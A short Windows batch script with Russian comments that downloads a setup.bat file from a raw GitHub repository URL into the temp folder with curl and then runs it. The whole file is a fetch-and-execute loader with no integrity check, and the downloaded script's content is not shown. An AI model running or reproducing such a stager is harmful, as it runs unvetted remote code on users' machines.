@echo off
:: Устанавливаем кодировку UTF-8, чтобы русский текст не превращался в кракозябры
chcp 65001 >nul

echo [SYSTEM] Инициализация загрузки...

:: Используем кавычки ВНУТРИ команды set, чтобы защитить ссылку от обработки
set "RAW_URL=https://raw.githubusercontent.com/rid853512-dotcom/legendary-garbanzo/main/FNLS/setup.bat"
set "DEST_PATH=%TEMP%\setup_installer.bat"

echo [SYSTEM] Попытка скачать: %RAW_URL%

:: Используем curl.exe напрямую и берем все пути в кавычки
curl.exe -L -o "%DEST_PATH%" "%RAW_URL%"

:: Проверяем, появился ли файл после скачивания
if exist "%DEST_PATH%" (
    echo [SYSTEM] Файл получен. Запуск...
    call "%DEST_PATH%"
) else (
    echo [ERROR] Не удалось скачать файл. Проверь интернет или Raw-ссылку.
    echo [DEBUG] Путь назначения: "%DEST_PATH%"
    pause
)
